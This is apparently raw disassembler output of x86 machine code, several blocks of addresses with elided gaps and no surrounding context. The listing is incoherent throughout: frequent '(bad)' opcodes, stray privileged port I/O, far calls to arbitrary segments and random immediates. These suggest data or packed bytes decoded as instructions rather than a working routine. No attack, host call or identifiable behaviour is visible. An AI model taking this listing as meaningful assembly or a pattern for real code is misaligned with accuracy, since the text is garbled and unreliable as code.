  416e81:	daa    
  416e82:	and    al,bl
  416e84:	stos   DWORD PTR es:[edi],eax
  416e85:	arpl   si,cx
  416e87:	lods   al,BYTE PTR ds:[esi]
  416e88:	xchg   ebx,eax
  416e89:	xor    ebx,ebx
  416e8b:	daa    
  416e8c:	add    edi,DWORD PTR [edi-0x1c]
  416e8f:	add    ebx,DWORD PTR [esi+0x67]
  416e92:	mov    ah,0x3b
  416e94:	mov    bl,0xa
  416e96:	mov    al,0xa
  416e98:	(bad)  
  416e99:	call   0x1eda8a98
  416e9e:	pop    ebx
  416e9f:	dec    ecx
  416ea0:	push   esi
  416ea1:	jp     0x416e8e
  416ea3:	pop    ebx
  416ea4:	aas    
  416ea5:	outs   dx,BYTE PTR ds:[esi]
  416ea6:	out    dx,eax
  416ea7:	and    al,0xc7
  416ea9:	icebp  
  416eaa:	xchg   ebp,eax
  416eab:	add    cl,al
  416ead:	pushf  
  416eae:	mul    BYTE PTR [ebx]
  416eb0:	xchg   edx,eax
  416eb1:	ins    BYTE PTR es:[edi],dx
  416eb2:	and    cl,ah
  416eb4:	push   ecx
  416eb5:	sub    DWORD PTR ds:0x2bd9f6ca,ecx
  416ebb:	mov    bh,0x9d
  416ebd:	ss js  0x416eaa
  416ec0:	out    0x0,al
	...
  416f32:	add    BYTE PTR [eax],al
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	fucomi st,st(6)
  416f42:	mov    ds:0xfa9a96,eax
  416f47:	add    ch,dh
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    BYTE PTR [eax+eax*4+0x27],dh
  416f4f:	out    0x95,al
  416f51:	adc    BYTE PTR [ecx-0x48ce0694],0xce
  416f58:	cli    
  416f59:	xor    BYTE PTR [edx],bh
  416f5b:	mov    ds:0xb53086c5,al
  416f60:	mov    dl,0xb7
  416f62:	add    DWORD PTR [esi],ebp
  416f64:	xor    bh,dh
  416f66:	nop
  416f67:	xor    bl,BYTE PTR [edx]
  416f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f6b:	xchg   BYTE PTR [ecx-0x3a],bh
  416f6e:	pop    es
  416f6f:	mov    al,0x6b
  416f71:	cmc    
  416f72:	mov    eax,0x1446a69
  416f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f78:	sub    DWORD PTR [edi+0x57],0x5e
  416f7c:	mov    eax,0xfde914a1
  416f81:	xor    eax,0xeee83098
  416f86:	call   0x234b:0xaad7176a
  416f8d:	out    0x6,eax
  416f8f:	fld    QWORD PTR [ecx]
  416f91:	sahf   
  416f92:	dec    ecx
  416f93:	inc    ebx
  416f94:	fst    QWORD PTR [ecx+0x1f]
  416f97:	add    DWORD PTR [eax-0x3c7f9389],eax
  416f9d:	or     esi,esi
  416f9f:	dec    ecx
  416fa0:	cdq    
  416fa1:	fbld   TBYTE PTR [ebx+0x60801f48]
  416fa7:	cmp    al,0x4d
  416fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416faa:	ret    0x97ad
  416fad:	div    BYTE PTR [ebx+0x64]
  416fb0:	iret   
  416fb1:	outs   dx,BYTE PTR ds:[esi]
  416fb2:	adc    DWORD PTR [ecx-0x7b],0x295f6c81
  416fb9:	push   0xaecf25c1
  416fbe:	test   cl,0x36
  416fc1:	jne    0x416fae
  416fc3:	js     0x41700e
  416fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fc6:	repz sbb eax,0xb85aef31
  416fcc:	xchg   esi,eax
  416fcd:	not    BYTE PTR [ebx]
  416fcf:	push   ecx
  416fd0:	adc    DWORD PTR [ecx+0x721fbe10],0xffffffc1
  416fd7:	mov    ds:0x821b28d6,eax
  416fdc:	mov    ch,0x2a
  416fde:	jle    0x416f71
  416fe0:	push   edx
  416fe1:	jb     0x416fbf
  416fe3:	mov    esi,edi
  416fe5:	xchg   esp,eax
  416fe6:	in     al,dx
  416fe7:	retf   0x8af1
  416fea:	xchg   edi,eax
  416feb:	int    0x9c
  416fed:	xchg   edx,eax
  416fee:	push   edx
  416fef:	mov    ebx,0x51640ffb
  416ff4:	lock int3 
  416ff6:	push   edi
  416ff7:	nop
  416ff8:	inc    ebp
  416ff9:	mov    BYTE PTR [eax-0x53884c83],dh
  416fff:	jge    0x417029
  417001:	jnp    0x41703a
  417003:	int    0x19
  417005:	aas    
  417006:	sub    ch,al
  417008:	pop    eax
  417009:	mov    gs,WORD PTR [ecx]
  41700b:	mov    cl,0x9
  41700d:	push   ebp
  41700e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41700f:	dec    esi
  417010:	ins    BYTE PTR es:[edi],dx
  417011:	mov    edx,0xadbc7693
  417016:	(bad)  
  417017:	es js  0x416ff3
  41701a:	add    BYTE PTR [ecx-0x3d],ch
  41701d:	stc    
  41701e:	or     BYTE PTR [ebp+esi*4+0x28],bl
  417022:	fnstcw WORD PTR [esi-0x6a2fd1d5]
  417028:	mov    ch,0x1c
  41702a:	addr16 mov esp,ss
  41702d:	(bad)  
  41702f:	dec    eax
  417030:	xchg   edx,eax
  417031:	cmc    
  417032:	sub    DWORD PTR [ecx+ebp*8],edx
  417035:	mov    ecx,0x3d7f276d
  41703a:	or     ah,BYTE PTR [edx-0x27]
  41703d:	jns    0x41708c
  41703f:	ss push edi
	...
  4170b1:	add    BYTE PTR [eax],al
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	or     DWORD PTR [ebx+eax*1+0x7],0x4c
  4170c4:	(bad)  
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR ds:0xba042b9,al
  4170d1:	add    DWORD PTR [eax+0x7740f547],esi
  4170d7:	data16 (bad) 
  4170da:	std    
  4170db:	jbe    0x4170f9
  4170dd:	ds aaa 
  4170df:	dec    esi
  4170e0:	js     0x4170c6
  4170e2:	push   esi
  4170e3:	inc    ebx
  4170e4:	fst    QWORD PTR [edx+esi*2]
  4170e7:	xchg   ebp,eax
  4170e8:	inc    edx
  4170e9:	mov    fs,WORD PTR [ecx]
  4170eb:	scas   eax,DWORD PTR es:[edi]
  4170ec:	scas   eax,DWORD PTR es:[edi]
  4170ed:	inc    esi
  4170ee:	aad    0x58
  4170f0:	loopne 0x4170cd
  4170f2:	inc    eax
  4170f3:	add    BYTE PTR [edx-0x7d],ch
  4170f6:	jmp    0x417160
  4170f8:	das    
  4170f9:	in     eax,0x5c
  4170fb:	addr16 fcmovnu st,st(0)
  4170fe:	enter  0xd656,0x8b
  417102:	retf   0x5eab
  417105:	scas   al,BYTE PTR es:[edi]
  417106:	add    dl,BYTE PTR [edi+0x17445596]
  41710c:	addr16 inc esp
  41710e:	jb     0x41716d
  417110:	xchg   ebx,eax
  417111:	adc    al,0x81
  417113:	out    dx,eax
  417114:	adc    al,0x6f
  417116:	push   edx
  417117:	and    BYTE PTR [edx+0x8],bh
  41711a:	push   esi
  41711b:	jb     0x4170f8
  41711d:	ins    DWORD PTR es:[edi],dx
  41711e:	out    0xef,al
  417120:	push   eax
  417121:	fld    QWORD PTR [ecx]
  417123:	mov    cl,BYTE PTR [ebp+0x53]
  417126:	or     al,cl
  417128:	dec    ebx
  417129:	sbb    cl,cl
  41712b:	retf   0x9e5f
  41712e:	gs push ss
  417130:	ror    DWORD PTR [ebp-0x5361e036],0x7c
  417137:	jo     0x41713b
  417139:	adc    al,0xe7
  41713b:	sub    al,0xee
  41713d:	push   ebx
  41713e:	dec    ecx
  41713f:	mov    edx,0x3167eff7
  417144:	shr    BYTE PTR [ecx-0x61],1
  417147:	and    edx,DWORD PTR [ebx]
  417149:	sbb    esp,edx
  41714b:	clc    
  41714c:	mov    ds:0x7d548bac,al
  417151:	mov    bl,0x42
  417153:	fcomip st,st(5)
  417155:	int3   
  417156:	sub    al,0x79
  417158:	adc    BYTE PTR [edx+ebp*2+0x60],dl
  41715c:	icebp  
  41715d:	or     ebx,DWORD PTR [edx+0x46]
  417160:	push   es
  417161:	add    ebx,DWORD PTR [edx-0x76]
  417164:	dec    esp
  417165:	scas   eax,DWORD PTR es:[edi]
  417166:	adc    DWORD PTR [eax],ecx
  417168:	enter  0xffa3,0x4f
  41716c:	ins    BYTE PTR es:[edi],dx
  41716d:	fucomi st,st(7)
  41716f:	dec    edi
  417170:	arpl   WORD PTR [ebx],bp
  417172:	nop
  417173:	mov    ebx,0xb4b5e05c
  417178:	out    0xf6,eax
  41717a:	mov    edx,0xcbd6f184
  41717f:	rcl    BYTE PTR [ebp-0x60101090],cl
  417185:	mov    WORD PTR [edx-0x13],ds
  417188:	jne    0x4171dc
  41718a:	sbb    edx,DWORD PTR [ecx]
  41718c:	xor    ch,dl
  41718e:	ror    esp,1
  417190:	jmp    0x417141
  417192:	jne    0x41714b
  417194:	stos   BYTE PTR es:[edi],al
  417195:	aas    
  417196:	add    DWORD PTR [edi],ecx
  417198:	mov    ebp,0x19198153
  41719d:	call   0x7bae:0x86657586
  4171a4:	jo     0x417170
  4171a6:	dec    ecx
  4171a7:	das    
  4171a8:	sub    BYTE PTR ds:0xbee09196,0x68
  4171af:	adc    DWORD PTR [esi],ecx
  4171b1:	cli    
  4171b2:	int3   
  4171b3:	in     al,dx
  4171b4:	pop    eax
  4171b5:	test   ah,ah
  4171b7:	int3   
  4171b8:	xor    eax,0x8d634ad1
  4171bd:	inc    ebx
  4171be:	sub    esi,ecx
  4171c0:	and    al,0x0
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 jmp 0x417223
  417242:	fwait
  417243:	repnz test ah,bh
  417246:	add    BYTE PTR [eax],al
  417248:	cmc    
  417249:	add    BYTE PTR [eax],al
  41724b:	add    BYTE PTR [ebx+0x49],bh
  41724e:	push   ebp
  41724f:	iret   
  417250:	sub    DWORD PTR [edi-0x10],eax
  417253:	push   edx
  417254:	xchg   ebp,eax
  417255:	mov    al,ds:0x527e91ea
  41725a:	xor    BYTE PTR [edi],al
  41725c:	cld    
  41725d:	inc    ecx
  41725e:	mov    ch,0x52
  417260:	push   edx
  417261:	push   ecx
  417262:	ror    BYTE PTR [edx],1
  417264:	cmovl  eax,DWORD PTR [ecx]
  417267:	ins    BYTE PTR es:[edi],dx
  417268:	rol    DWORD PTR [edi+eax*8+0x1f],1
  41726c:	ins    BYTE PTR es:[edi],dx
  41726d:	ja     0x4172df
  41726f:	pusha  
  417270:	test   eax,0x2fb7f54e
  417275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417276:	jnp    0x4172e2
  417278:	mul    BYTE PTR [edi]
  41727a:	mov    DWORD PTR [ecx],esi
  41727c:	shr    DWORD PTR [eax],cl
  41727e:	shl    DWORD PTR [ebx+0x72],1
  417281:	retf   0x2d0
  417284:	pop    ebp
  417285:	aad    0xd2
  417287:	lods   eax,DWORD PTR ds:[esi]
  417288:	pop    ds
  417289:	push   0x7c2a3756
  41728e:	inc    ebx
  41728f:	test   al,0x9f
  417291:	sbb    DWORD PTR [eax+0x729a9605],0x25967c29
  41729b:	js     0x4172ad
  41729d:	mov    eax,ds:0xe6e50b85
  4172a2:	pop    esp
  4172a3:	mov    WORD PTR [eax+0x5292301b],?
  4172a9:	pushf  
  4172aa:	mov    esp,0xc5349a3f
  4172af:	add    DWORD PTR [ebp-0x5e08012d],ebp
  4172b5:	jle    0x4172b7
  4172b7:	(bad)  
  4172b8:	scas   eax,DWORD PTR es:[edi]
  4172b9:	add    BYTE PTR ds:0x7467d0b6,cl
  4172bf:	fdivrp st(3),st
  4172c1:	rcr    DWORD PTR [ebx],0x99
  4172c4:	sub    eax,ebp
  4172c6:	mov    edx,0x4698ba77
  4172cb:	xchg   BYTE PTR [edi+0x22],cl
  4172ce:	inc    eax
  4172cf:	mov    bl,0x75
  4172d1:	clc    
  4172d2:	adc    edi,esi
  4172d4:	lds    edx,FWORD PTR [ebx]
  4172d6:	adc    dl,BYTE PTR [ecx]
  4172d8:	and    esi,DWORD PTR [esi]
  4172da:	leave  
  4172db:	pop    esp
  4172dc:	dec    esi
  4172dd:	dec    BYTE PTR [ebp-0x6e264d5e]
  4172e3:	aad    0x64
  4172e5:	icebp  
  4172e6:	loope  0x4172e4
  4172e8:	and    esi,ebp
  4172ea:	sub    ah,BYTE PTR [eax-0x3587b65e]
  4172f0:	addr16 xchg ebp,eax
  4172f2:	xchg   ebp,eax
  4172f3:	add    BYTE PTR [ecx+edi*8],dh
  4172f6:	enter  0x16c5,0xff
  4172fa:	push   edx
  4172fb:	inc    esi
  4172fc:	sub    al,0xcc
  4172fe:	aas    
  4172ff:	gs ins DWORD PTR es:[edi],dx
  417301:	xor    al,0xf
  417303:	jb     0x417292
  417305:	inc    eax
  417306:	push   edx
  417307:	ret    
  417308:	dec    ebx
  417309:	and    bh,BYTE PTR [ebx*2+0x53c92e32]
  417310:	mov    DWORD PTR [edx],edi
  417312:	popf   
  417313:	out    dx,al
  417314:	outs   dx,BYTE PTR ds:[esi]
  417315:	pop    ecx
  417316:	cmp    al,0xe6
  417318:	frstor [ebx]
  41731a:	mov    bl,0x8d
  41731c:	(bad)  
  41731d:	add    BYTE PTR [esi-0x6e],bl
  417320:	shl    BYTE PTR [edx],1
  417322:	scas   al,BYTE PTR es:[edi]
  417323:	out    dx,eax
  417324:	mov    eax,0xb2094431
  417329:	into   
  41732a:	bnd ja 0x4172e1
  41732d:	fwait
  41732e:	or     edi,DWORD PTR [ebx-0x7238dd2e]
  417334:	fidivr WORD PTR [ebp-0x3ee07efc]
  41733a:	sub    eax,0xb799952f
  41733f:	mov    ecx,0x8b
	...
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x2a
  4173c1:	pop    eax
  4173c2:	pop    ebx
  4173c3:	repz jns 0x4173c3
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	cmc    
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    dl,ch
  4173cd:	xchg   esi,eax
  4173ce:	in     eax,0x6e
  4173d0:	aad    0xa0
  4173d2:	out    dx,al
  4173d3:	(bad)  
  4173d4:	rol    DWORD PTR [ebp-0x53e1d87f],cl
  4173da:	cmp    al,0xe6
  4173dc:	jmp    0x417394
  4173de:	add    ecx,DWORD PTR [ecx-0x685e4ac2]
  4173e4:	cmp    eax,0x3c411dcd
  4173e9:	cmp    DWORD PTR [edx+0x4ed7869],0xffffff98
  4173f0:	mov    bl,0x8d
  4173f2:	aas    
  4173f3:	cmp    DWORD PTR [esi+0x44abdf4e],ebx
  4173f9:	inc    edi
  4173fa:	adc    eax,DWORD PTR ds:0x270589c6
  417400:	setno  dh
  417403:	jb     0x41745a
  417405:	or     DWORD PTR [esi],edi
  417407:	sub    al,0x4a
  417409:	xchg   esi,eax
  41740a:	pop    esp
  41740b:	adc    eax,0xb5cf8b05
  417410:	mov    ebp,0x49dc9b66
  417415:	sbb    DWORD PTR [eax],edi
  417417:	xor    ebp,edx
  417419:	pop    edx
  41741a:	jg     0x4173e7
  41741c:	mov    eax,DWORD PTR [ecx]
  41741e:	sub    BYTE PTR [ecx+0x4173c5f0],dl
  417424:	jp     0x41742d
  417426:	cmp    dl,ah
  417428:	cmp    al,0x9b
  41742a:	test   DWORD PTR [edx],edx
  41742c:	(bad)  
  41742f:	cmp    DWORD PTR [ebx],esi
  417431:	cli    
  417432:	out    0xbe,eax
  417434:	popa   
  417435:	sbb    BYTE PTR [esi+0x26],ch
  417438:	and    eax,0xcc6adb4f
  41743d:	test   BYTE PTR [eax],dl
  41743f:	cmp    edx,DWORD PTR [eax]
  417441:	inc    ecx
  417442:	fwait
  417443:	and    al,0xa6
  417445:	mov    BYTE PTR [edx],bh
  417447:	aaa    
  417448:	ss jmp 0x67fa7a30
  41744e:	in     al,dx
  41744f:	cs cs mul DWORD PTR cs:[esi]
  417454:	inc    edi
  417455:	arpl   WORD PTR [esi-0x28],ax
  417458:	lea    edi,[edi+0x671f8879]
  41745e:	pop    edi
  41745f:	cwde   
  417460:	inc    ecx
  417461:	mov    ah,0xe2
  417463:	pop    edi
  417464:	setns  BYTE PTR [ecx-0x4e]
  417468:	jae    0x41747f
  41746a:	jb     0x4173f3
  41746c:	(bad)  [edi]
  41746e:	xor    al,0xbf
  417470:	jno    0x417488
  417472:	dec    esi
  417473:	enter  0xc951,0x65
  417477:	inc    edi
  417478:	jg     0x417401
  41747a:	clc    
  41747b:	push   ss
  41747c:	or     eax,DWORD PTR fs:[ecx+0x65]
  417480:	imul   edi,DWORD PTR [esi+edi*4+0x46dce957],0xe4649c2e
  41748b:	nop
  41748c:	cmc    
  41748d:	ret    
  41748e:	jl     0x41746c
  417490:	adc    eax,0xf310c3f9
  417495:	push   cs
  417496:	ret    
  417497:	stos   BYTE PTR es:[edi],al
  417498:	stos   DWORD PTR es:[edi],eax
  417499:	mov    dh,0x34
  41749b:	mov    dh,0x2b
  41749d:	xlat   BYTE PTR cs:[ebx]
  41749f:	scas   al,BYTE PTR es:[edi]
  4174a0:	dec    edx
  4174a1:	cmp    BYTE PTR [esi+0x7d17157c],0xb0
  4174a8:	(bad)  
  4174aa:	jnp    0x4174db
  4174ac:	cld    
  4174ad:	rcr    DWORD PTR [esi],0x8a
  4174b0:	adc    DWORD PTR [ebx-0x48213246],0xe633be1e
  4174ba:	inc    eax
  4174bb:	cwde   
  4174bc:	jo     0x417538
  4174be:	test   DWORD PTR [edx-0x69],esp
	...
  417531:	add    BYTE PTR [eax],al
  417533:	add    BYTE PTR ds:0xfff32bd8,ah
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x1def3b7a
  417542:	cmp    ebx,edi
  417544:	outs   dx,BYTE PTR ds:[esi]
  417545:	inc    BYTE PTR [eax]
  417547:	add    ch,dh
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [ecx+eax*4+0x3f],bh
  41754f:	call   0xf10f:0xc5046c4
  417556:	bound  ebx,QWORD PTR [edi]
  417558:	or     al,0xbd
  41755a:	cmp    al,0x92
  41755c:	test   ah,ah
  41755e:	sub    eax,0x8d7b43f9
  417563:	cmp    DWORD PTR [esi+0x52b85e8f],0x53
  41756a:	pop    ds
  41756b:	mov    esp,0x84f50979
  417570:	mov    ch,BYTE PTR [esi+0x4a]
  417573:	mov    cl,0x73
  417575:	adc    DWORD PTR [edx-0x6bb98fe7],ebx
  41757b:	enter  0x6d84,0x0
  41757f:	mov    ecx,0xe23ec277
  417584:	aaa    
  417585:	mov    cl,0x7c
  417587:	(bad)  
  417588:	vandnps ymm4,ymm1,ymm4
  41758c:	cld    
  41758d:	jle    0x417562
  41758f:	popf   
  417590:	add    BYTE PTR ds:0x12938422,0x7e
  417597:	jno    0x41758e
  417599:	repz xor al,ch
  41759c:	bound  esp,QWORD PTR [edi-0x44]
  41759f:	and    BYTE PTR [ebx+eiz*2+0x97ec9ed],0x34
  4175a7:	pushf  
  4175a8:	in     eax,0x4
  4175aa:	shl    BYTE PTR [edi+ecx*4-0x6f],cl
  4175ae:	xor    esi,DWORD PTR [edi+0x6cc6d17f]
  4175b4:	push   es
  4175b5:	pop    ebp
  4175b6:	out    0x9d,eax
  4175b8:	pop    edi
  4175b9:	les    esp,FWORD PTR [ecx-0x6]
  4175bc:	scas   al,BYTE PTR es:[edi]
  4175bd:	icebp  
  4175be:	mov    ebx,0x59fb2038
  4175c3:	xlat   BYTE PTR ds:[ebx]
  4175c4:	push   0x14
  4175c6:	pop    esp
  4175c7:	sti    
  4175c8:	retf   0xf6e8
  4175cb:	add    eax,DWORD PTR [edx-0x7cd4c976]
  4175d1:	aad    0x63
  4175d3:	addr16 xchg esi,eax
  4175d5:	pushf  
  4175d6:	popf   
  4175d7:	or     edx,DWORD PTR [edx]
  4175d9:	leave  
  4175da:	or     BYTE PTR [eax-0x2f],dl
  4175dd:	in     eax,dx
  4175de:	out    0x88,eax
  4175e0:	inc    DWORD PTR [ecx+0x2]
  4175e3:	aad    0x7a
  4175e5:	stos   DWORD PTR es:[edi],eax
  4175e6:	ss mov ebx,0xae6166e7
  4175ec:	or     bh,BYTE PTR [edi-0x5137b156]
  4175f2:	add    al,0xb8
  4175f4:	std    
  4175f5:	fcom   QWORD PTR [edi]
  4175f7:	mov    ebx,0x1872eb56
  4175fc:	mov    ebp,0xa9b33836
  417601:	jnp    0x4175d5
  417603:	mov    fs,WORD PTR [ecx+0x5bfcea06]
  417609:	mov    al,ch
  41760b:	pushf  
  41760c:	xchg   ebx,eax
  41760d:	std    
  41760e:	es or  dl,al
  417611:	jp     0x41759f
  417613:	stc    
  417614:	pop    esi
  417615:	pushf  
  417616:	mov    ds:0xf7e24db2,al
  41761b:	cmp    al,0x20
  41761d:	pop    ecx
  41761e:	xor    al,0x21
  417620:	cmp    al,0x13
  417622:	push   ecx
  417623:	xor    al,0x99
  417625:	push   esp
  417626:	in     eax,0x49
  417628:	stos   BYTE PTR es:[edi],al
  417629:	mov    ebx,ds
  41762b:	mov    edi,0x69021c46
  417630:	cmp    cl,dh
  417632:	lea    ecx,[ecx+0x15418a5e]
  417638:	int    0x98
  41763a:	mov    ah,0xe3
  41763c:	sub    al,BYTE PTR [ecx]
  41763e:	loopne 0x417654
  417640:	mov    esi,0x0
	...
  4176b1:	add    BYTE PTR [eax],al
  4176b3:	add    ah,al
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	(bad)  
  4176c1:	fsub   st,st(6)
  4176c3:	pop    edi
  4176c4:	arpl   di,di
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	cmc    
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [ebx-0x1bb4abc7],ch
  4176d1:	fisubr WORD PTR [esi+0x42]
  4176d4:	cmp    eax,0x81f7bea2
  4176d9:	jbe    0x41770f
  4176db:	adc    BYTE PTR ds:[si-0x2416],0x80
  4176e2:	popa   
  4176e3:	(bad)  
  4176e4:	test   eax,0x4a20970
  4176e9:	enter  0x4d79,0x75
  4176ed:	adc    al,0x54
  4176ef:	jmp    0x3686:0x463410c7
  4176f6:	or     DWORD PTR [eax+ebx*4],esi
  4176f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fa:	ror    DWORD PTR [edi-0xb],cl
  4176fd:	jp     0x4176bf
  4176ff:	aaa    
  417700:	push   ds
  417701:	inc    edx
  417702:	test   edi,esi
  417704:	xor    cl,BYTE PTR [ecx+0x7542c3a]
  41770a:	pop    ss
  41770b:	clc    
  41770c:	inc    esi
  41770d:	push   0xffffffe5
  41770f:	jge    0x417715
  417711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417712:	mov    BYTE PTR [edi+0x24],bh
  417715:	maskmovq mm0,(bad)
  417716:	test   DWORD PTR [eax-0x5a],0x992106d4
  41771d:	and    eax,0x3f7fe657
  417722:	ins    DWORD PTR es:[edi],dx
  417723:	dec    edx
  417724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417725:	loopne 0x417785
  417727:	fldenv [esi]
  417729:	inc    edi
  41772a:	xlat   BYTE PTR ds:[ebx]
  41772b:	ror    ah,cl
  41772d:	jp     0x417746
  41772f:	ror    DWORD PTR [edi],0xe9
  417732:	stos   BYTE PTR es:[edi],al
  417733:	push   es
  417734:	jg     0x417780
  417736:	mov    edx,0xcd97fef6
  41773b:	fmul   DWORD PTR [edx+edi*8+0x5738f1e3]
  417742:	adc    eax,0x284f395d
  417747:	fcmovne st,st(6)
  417749:	mov    ds:0xa0db0ba3,eax
  41774e:	xor    al,0x80
  417750:	jno    0x41770b
  417752:	sub    al,0x85
  417754:	lods   eax,DWORD PTR ds:[esi]
  417755:	fld    DWORD PTR [ebp+0x3b]
  417758:	adc    edx,esi
  41775a:	and    al,0x8c
  41775c:	cmc    
  41775d:	dec    edi
  41775e:	jg     0x417763
  417760:	cmc    
  417761:	inc    esi
  417762:	xchg   ecx,eax
  417763:	popf   
  417764:	mov    ds:0x8490ca47,al
  417769:	dec    eax
  41776a:	xor    al,0x2b
  41776c:	cmp    esp,DWORD PTR [ebx+0x4e]
  41776f:	push   esi
  417770:	scas   eax,DWORD PTR es:[edi]
  417771:	repz retf 
  417773:	or     ch,BYTE PTR [edi+ebx*8+0x2]
  417777:	arpl   WORD PTR [edi+0x75],cx
  41777a:	ret    
  41777b:	pop    esp
  41777c:	in     al,0x3f
  41777e:	hlt    
  41777f:	(bad)  
  417780:	sub    eax,0x6090a236
  417785:	fidiv  WORD PTR [esi-0x51c677f4]
  41778b:	pop    esi
  41778c:	in     eax,0x6d
  41778e:	stos   BYTE PTR es:[edi],al
  41778f:	(bad)  
  417790:	aaa    
  417791:	jmp    0x4177b3
  417793:	ss (bad) 
  417795:	fsubr  st,st(3)
  417797:	test   eax,0xe31f0a4c
  41779c:	mov    al,ds:0x61422f28
  4177a1:	inc    esp
  4177a2:	(bad)  
  4177a3:	iret   
  4177a4:	pop    ebp
  4177a5:	and    eax,0x6f41b55c
  4177aa:	pop    ebp
  4177ab:	sub    ch,BYTE PTR [esi+0xf]
  4177ae:	popf   
  4177af:	adc    dl,dl
  4177b1:	mov    dl,0xa6
  4177b3:	in     eax,dx
  4177b4:	inc    ebx
  4177b5:	rcr    DWORD PTR [ebx-0x38],0xcd
  4177b9:	lds    eax,FWORD PTR [ebp+0x1fcfda2e]
  4177bf:	inc    eax
  4177c0:	adc    DWORD PTR [eax],eax
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x3f7d6e99
  417841:	sahf   
  417842:	std    
  417843:	add    BYTE PTR [eax+0x0],bl
  417846:	add    DWORD PTR [eax],eax
  417848:	cmc    
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [ecx+0x6a5bb5e8],dl
  417851:	mov    WORD PTR [ebp-0xa30232f],fs
  417857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417858:	mov    ch,0xe9
  41785a:	mov    dl,0x6e
  41785c:	fcmovnb st,st(7)
  41785e:	nop
  41785f:	xchg   esi,eax
  417860:	and    esp,DWORD PTR [ecx]
  417862:	fsub   DWORD PTR [ecx-0x3e]
  417865:	cmp    eax,0x76d6ab90
  41786a:	or     eax,0x9a49275f
  41786f:	cmp    al,0x26
  417871:	or     DWORD PTR [esi],0xbcff3d79
  417877:	stos   DWORD PTR es:[edi],eax
  417878:	imul   edx
  41787a:	ret    0xbeba
  41787d:	pop    es
  41787e:	outs   dx,BYTE PTR ds:[esi]
  41787f:	ror    DWORD PTR [ebx+esi*8-0x738a9843],0xd1
  417887:	sub    DWORD PTR [eax],eax
  417889:	es mov ecx,0x6f106662
  41788f:	cmp    DWORD PTR [esp+esi*4+0xc],0xe6cdf54a
  417897:	sbb    eax,edi
  417899:	xchg   DWORD PTR [ebp+0x10],ebx
  41789c:	leave  
  41789d:	add    ax,0x52e3
  4178a1:	dec    ecx
  4178a2:	popa   
  4178a3:	cmc    
  4178a4:	leave  
  4178a5:	and    eax,0x52439477
  4178aa:	jmp    0x417907
  4178ac:	ror    edi,1
  4178ae:	cmp    DWORD PTR [edx],edx
  4178b0:	pop    ebp
  4178b1:	xchg   edi,eax
  4178b2:	test   eax,0xec63eaed
  4178b7:	xlat   BYTE PTR ds:[ebx]
  4178b8:	xor    eax,0xe583c9c7
  4178bd:	ficom  WORD PTR [ecx]
  4178bf:	ret    
  4178c0:	jns    0x4178e0
  4178c2:	mov    ds:0x4698c69b,eax
  4178c7:	mov    eax,ds:0x20a5438f
  4178cc:	(bad)  
  4178cf:	inc    ecx
  4178d0:	xor    eax,ebx
  4178d2:	jne    0x4178ec
  4178d4:	fs xchg edx,eax
  4178d6:	sub    dh,dl
  4178d8:	lahf   
  4178d9:	mov    dh,0x1c
  4178db:	ret    
  4178dc:	imul   edi,DWORD PTR [ecx],0x208799d0
  4178e2:	sbb    al,0x3c
  4178e4:	sti    
  4178e5:	iret   
  4178e6:	data16 icebp 
  4178e8:	dec    edi
  4178e9:	dec    ebp
  4178ea:	or     esi,DWORD PTR [ebp-0x5e]
  4178ed:	adc    ecx,esi
  4178ef:	cs inc edi
  4178f1:	popa   
  4178f2:	xor    BYTE PTR [ecx+0x29ce4dbf],0xcf
  4178f9:	dec    ebx
  4178fa:	or     al,0x3e
  4178fc:	mov    edi,0xd611ce28
  417901:	cmp    DWORD PTR [ebp+0x559e86de],edx
  417907:	inc    edx
  417908:	inc    eax
  417909:	and    BYTE PTR [ecx+0x13],dh
  41790c:	pop    ds
  41790d:	jo     0x417890
  41790f:	push   eax
  417910:	mov    bl,BYTE PTR ds:0x181adc
  417916:	mov    ebx,0x86860129
  41791b:	sub    eax,0x65e8b6d
  417920:	push   ds
  417921:	(bad)  
  417922:	aam    0x40
  417924:	popa   
  417925:	mov    WORD PTR [ecx+0x50],cs
  417928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
